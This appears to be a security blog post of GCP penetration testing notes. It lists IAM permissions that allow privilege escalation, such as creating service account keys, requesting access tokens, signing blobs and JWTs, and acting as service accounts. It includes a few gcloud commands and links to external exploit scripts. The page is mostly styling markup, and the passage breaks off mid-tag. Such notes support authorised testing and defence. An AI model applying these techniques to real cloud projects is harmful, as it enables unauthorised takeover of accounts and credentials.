---
layout: post
title:  GCP Penetration Testing Notes 2
description: Compiled notes I read from additional blogs and posts about GCP penetration testing.
date:   2022-10-24 
image:  '/images/GCP-Penetration-Testing-Notes-2.jpg'
tags:   [Notes, Privesc, GCP]
---

<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>GCP Penetration Testing Notes 2</title>
<style>
.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style>
The PDF version of these notes can be found <a href="https://0xd4y.com/misc/GCP_Penetration_Testing_Notes_2.pdf">here.</a>
</head><body><article id="e0f928c1-a83c-48cf-919c-c74733148fcb" class="page sans"><header><img class="page-cover-image" src="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Notes_Cover.png" style="object-position:center 50%"/><h1 class="page-title">GCP Penetration Testing Notes 2</h1></header><div class="page-body"><h2 id="5fe32173-142d-4f38-ba30-b2cb2149884d" class="">Contact</h2><p id="865778da-355e-46da-83dd-0f55bf6b3093" class="">LinkedIn: <a href="https://www.linkedin.com/in/segev-eliezer/">https://www.linkedin.com/in/segev-eliezer/</a></p><p id="2e1a8d52-b060-4ff4-bdbb-2b8f85f6c147" class="">YouTube: <a href="https://YouTube.com/@0xd4y">https://YouTube.com/@0xd4y</a> </p><p id="03a12d26-9f23-452f-8874-5d3a057096cb" class="">GitHub: <a href="https://github.com/0xd4y">https://github.com/0xd4y</a></p><h1 id="58002b7e-acf6-413f-80bd-333dab5e7429" class="">Table of Contents</h1><nav id="039883c3-813c-4d8a-a507-5716c86a7530" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#5fe32173-142d-4f38-ba30-b2cb2149884d">Contact</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#58002b7e-acf6-413f-80bd-333dab5e7429">Table of Contents</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#442e1f29-15e1-4654-85a6-2839c915987f">Privilege Escalation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b202b558-4021-454d-aa3d-61deda510451">Deployment Manager</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#18ca201a-d7a7-4634-ba13-4a2c5c0f442c">Actions Allowed</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#822771cd-d356-482f-9662-4965b7107810">IAM</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#950bc825-9478-43aa-ab38-b966acec287c">Roles Update</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#c18e097f-6aa0-4615-8786-d9ced03db0e0">Get Access Token</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#99cd378c-45d5-4a4d-b0db-12574f40b75e">Create Keys</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#29b79f96-7c68-41e2-ae60-6911a85fc3ae">Implicit Delegation</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#489d529f-6053-4b21-a29d-e857fbe00106">Sign Blob</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#bc9d8ce2-41ba-46ff-a0b9-e6cf3e543637">Sign JWT</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#7d12eb47-e0c6-47f7-8cec-598f3f48fdaf">Act As</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#53689f6e-93f8-47ee-b7c7-b46774b59cb2">Non-IAM</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#1c617f1a-7e2b-45b6-b927-15bd423fd729">Orgpolicy Set</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#31ac0c8e-a412-478e-9d31-5f29abea6529">Create HMAC Keys</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#c8bd6f99-3195-49ef-b3f3-6de1c06337a5">Create API Keys</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#f5eaba1e-9c18-4252-8be5-e13bbc8c5d68">List API keys</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#f881a99f-3de4-4aa8-99cd-db7d0b810d79">Red Flag Permissions</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#d8986773-7730-4dab-bf39-a105830fc186">Google Storage</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#6acd39e8-49e5-4c43-aa92-8dc6c4988efa">Enumeration</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#8a5f17b8-d8ad-4a62-ba71-604b24c35b78">Set Bucket Policy</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#d8dda75f-4f0d-4b2a-9519-08c575e4f5cf">Cloud Build</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#c2e45ea2-978b-474c-a463-ee949940114c">Methodology</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#13e2543e-3243-4f07-8f62-043825d22715">Remediation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#840dac61-b3a2-4b39-b570-624f777a44fe">GKE</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#966e2403-98cb-4a82-8682-ee10fa58a37b">Kubernetes Threat Matrix</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e7867a49-98c8-467f-9188-173a02219099">Kubelet</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#8ac29e0d-a112-4dcc-9754-ebbdf5ca7133">TLS Bootstrapping</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#1bd8546f-1b78-417a-83f5-3a4eca6917f8">Service Account Token</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#c4cd63e9-2199-46f1-a5cd-e9ba3e962936">Mitigations</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#3101e5a8-538e-4adf-9f74-5ffaf39eea76">Tools</a></div></nav><h1 id="442e1f29-15e1-4654-85a6-2839c915987f" class="">Privilege Escalation</h1><p id="3287ca6c-3370-4a20-a04c-404e73e4ee19" class="">Notes for the following blog post by RhinoSecurityLabs: <a href="https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/">https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/</a></p><h2 id="b202b558-4021-454d-aa3d-61deda510451" class="">Deployment Manager</h2><p id="511fcd0d-51a0-400e-b03d-ba7d8204e510" class="">Privesc using the <code>deploymentmanager.deployments.create</code> permission</p><h3 id="18ca201a-d7a7-4634-ba13-4a2c5c0f442c" class="">Actions Allowed</h3><ul id="ecd63f09-18dc-48c8-bf43-91f5b0d190bd" class="bulleted-list"><li style="list-style-type:disc">launch new deployments as the <code>&lt;PROJECT_NUMBER&gt;@cloudservices.gserviceaccount.com</code> service account without needing <code>iam.serviceAccounts.actAs</code> permission</li></ul><ul id="370cc0d2-63de-44e4-90fb-92f6e4a6986f" class="bulleted-list"><li style="list-style-type:disc">deployments provided <code>Editor</code> role within project</li></ul><ul id="4b37283b-8425-4e05-811f-d69abdec881b" class="bulleted-list"><li style="list-style-type:disc"><code>compute.instances.create</code> not needed because the <code>cloudservices</code> service account has that permission, so you can create a Compute VM</li></ul><ul id="b6d93801-92a9-4623-99cd-10bbffec58d2" class="bulleted-list"><li style="list-style-type:disc">can use a <code>YAML</code> configuration file template to create all kinds of resources<ul id="d2708184-ebf4-402c-ad3e-b1d3bff8952a" class="bulleted-list"><li style="list-style-type:circle">run <code>gcloud deployment-manager types list</code> to see supported resources</li></ul></li></ul><h2 id="822771cd-d356-482f-9662-4965b7107810" class="">IAM</h2><p id="238b8c4e-fdd0-4ae9-ac28-773e810844f8" class=""><a href="https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-1">https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-1</a></p><h3 id="950bc825-9478-43aa-ab38-b966acec287c" class="">Roles Update</h3><p id="ea92c067-7696-475d-910e-5f391535fcee" class=""><code>iam.roles.update</code></p><ul id="e77ddec9-e535-4f90-9e9a-18694fbe0c1e" class="bulleted-list"><li style="list-style-type:disc">add permissions to a role you are assigned to</li></ul><figure id="5e316a10-735b-4b49-b4ea-2bc74fcd12eb" class="image"><a href="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled.png"><img style="width:1000px" src="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled.png"/></a></figure><p id="2dc02630-f52f-4e6a-8d8b-43b68c474dc0" class=""><code>gcloud iam roles &lt;ROLE_NAME&gt; --project &lt;PROJECT_NAME&gt; --add-permissions &lt;PERMISSION&gt;</code></p><p id="d165906c-1279-45a3-8c5a-7a22fa7a7dd7" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.roles.update.py">Exploit script</a></p><h3 id="c18e097f-6aa0-4615-8786-d9ced03db0e0" class="">Get Access Token</h3><p id="1ffae01f-2836-4e48-a7c5-ba29f4bf633b" class=""><code>iam.serviceAccounts.getAccessToken</code></p><ul id="a7adddfe-e5d3-4b77-817b-29a80563bd08" class="bulleted-list"><li style="list-style-type:disc">permission to request access token for a service account</li></ul><ul id="b82b8464-f78b-4fde-9ac4-2154ced78c76" class="bulleted-list"><li style="list-style-type:disc">request access token for a higher-privileged service account</li></ul><p id="7fe77374-b0df-4802-9f8b-a89db9a05c40" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getAccessToken.py">Exploit script</a></p><h3 id="99cd378c-45d5-4a4d-b0db-12574f40b75e" class="">Create Keys</h3><p id="744f5da5-72a3-4dc6-ab2a-d762ed210978" class=""><code>iam.serviceAccountKeys.create</code></p><ul id="a02146d2-766a-4b59-aa12-cc25ed0a0270" class="bulleted-list"><li style="list-style-type:disc">permission to create a key for a service account</li></ul><ul id="3573fd50-0a92-45fd-84e1-096ec9c81f82" class="bulleted-list"><li style="list-style-type:disc">create a key as the service account and then authenticate as them</li></ul><p id="0272e3f9-89da-416a-90d6-606f9ac60e66" class=""><code>gcloud iam service-accounts keys create --iam-account &lt;SERVICE_ACCOUNT_NAME&gt;@&lt;PROJECT&gt;.iam.gserviceaccount..com</code> </p><p id="e9facfea-c295-49e6-b56a-55aa24e3b2ef" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccountKeys.create.py">Exploit script</a></p><h3 id="29b79f96-7c68-41e2-ae60-6911a85fc3ae" class="">Implicit Delegation</h3><p id="f99ab899-6cfd-4e6f-b8ed-4fc8c9fa2c7a" class=""><code>iam.serviceAccounts.implicitDelegation</code></p><p id="0eecc4c7-69d8-477b-bea1-c786ba930f3d" class="">If you have this permission on another service account with <code>iam.serviceAccounts.getAccessToken</code> , you can get the access token for another service account through implicit delegation:</p><figure id="567b0c9e-9bd9-46e9-a479-de151ac524c3" class="image"><a href="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%201.png"><img style="width:500px" src="../../../../images/GCP%20Penetration%20Testing%20Notes%202%20e0f928c1a83c48cf919cc74733148fcb/Untitled%201.png"/></a></figure><p id="17a379de-82cb-49c1-9b56-7517c64f8484" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.implicitDelegation.py">Exploit script</a></p><h3 id="489d529f-6053-4b21-a29d-e857fbe00106" class="">Sign Blob</h3><p id="92985a36-0545-4699-bde3-433c1ca6636e" class=""><code>iam.serviceAccounts.signBlob</code></p><ul id="7901b91e-41f6-4852-86eb-4d17f9ebda3b" class="bulleted-list"><li style="list-style-type:disc">create a signed blob that retrieves the access token for the targeted service account1</li></ul><ul id="98466487-4a10-4ba2-99af-7c8347ed2ffd" class="bulleted-list"><li style="list-style-type:disc">sign arbitrary payload</li></ul><p id="bfd2d5b9-2812-446c-b8aa-fd7296cbf7f8" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-accessToken.py">Exploit Script 1</a></p><p id="4b86cfc6-ae2f-4b7e-944c-59b4c7000f54" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-gcsSignedUrl.py">Exploit Script 2</a></p><h3 id="bc9d8ce2-41ba-46ff-a0b9-e6cf3e543637" class="">Sign JWT</h3><p id="ce6c48f8-08d7-4dfa-bb9c-4bb524b1e25a" class=""><code>iam.serviceAccounts.signJwt</code></p><ul id="36a5a729-f7f2-43e8-b727-750371210231" class="bulleted-list"><li style="list-style-type:disc">sign a JWT and request an access token for the targeted service account</li></ul><p id="b4b4ca25-5ad2-4189-b20a-03f362d23298" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signJWT.py">Exploit Script</a></p><h3 id="7d12eb47-e0c6-47f7-8cec-598f3f48fdaf" class="">Act As</h3><p id="a697bdf4-51d8-4eef-b969-ff463a617baa" class=""><code>iam.serviceAccounts.actAs</code></p><ul id="c82ed3df-dd76-4210-83e4-de2fedf491eb" class="bulleted-list"><li style="list-style-type:disc">GCP version of AWS <code>iam:PassRole</code></li></ul><ul id="b4faa275-a093-4108-be53-d9a2b4b408f7" class="bulleted-list"><li style="list-style-type:disc">create a new resource as the targeted service account<ul id="719fa71c-4ef9-43ee-98a6-272f02882fc0" class="bulleted-list"><li style="list-style-type:circle">the new resource can be a function, Compute Engine instance, etc.</li></ul></li></ul><p id="5c18cb88-972f-45ec-ae1f-df6d56453224" class="">
</p><p id="020c9cca-e25e-46a7-8e31-30f1feab523b" class=""><strong>Cloud Function Creation</strong></p><ul id="09ea7138-ef17-4a6c-83d7-38d22c900c2f" class="bulleted-list"><li style="list-style-type:disc">create a cloud function with a higher-privileged service account and then invoke it</li></ul><p id="cd4bb589-a9c2-4d23-b3ff-a189f3e1fa57" class="">The following permissions are necessary:</p><ol type="1" id="bd5336b1-e3c2-4e92-8937-80296a816102" class="numbered-list" start="1"><li><code><a href="https://cloudfunctions.functions.call/">c</a></code><code>loudfunctions.functions.call</code> or <code>cloudfunctions.functions.setIamPolicy</code><ol type="a" id="3a461f69-2347-4fac-abd8-480586c0d781" class="numbered-list" start="1"><li>Either immediately invoke a function or set the IAM policy of the function to allow you to invoke it.</li></ol></li></ol><ol type="1" id="7ffd6672-3a66-4f86-a986-8cc693e1c9a9" class="numbered-list" start="2"><li><code>cloudfunctions.functions.create</code>: create new functions</li></ol><ol type="1" id="04881871-a883-49b5-8f43-63d94b298aa8" class="numbered-list" start="3"><li><code>cloudfunctions.functions.sourceCodeSet</code>: update function source code</li></ol><ol type="1" id="8bf5c5dc-a879-4a77-8ce1-914a9e55e4f4" class="numbered-list" start="4"><li><code>iam.serviceAccounts.actAs</code></li></ol><p id="c30ed395-442f-455f-9462-d7f165b9fec2" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py">Exploit Script 1</a></p><p id="a91de8c9-f04c-4eaf-bbde-116d73c97694" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py">Exploit Script 2</a></p><p id="4213c277-8d13-4863-8c1e-4e4f8c9d8566" class=""><a 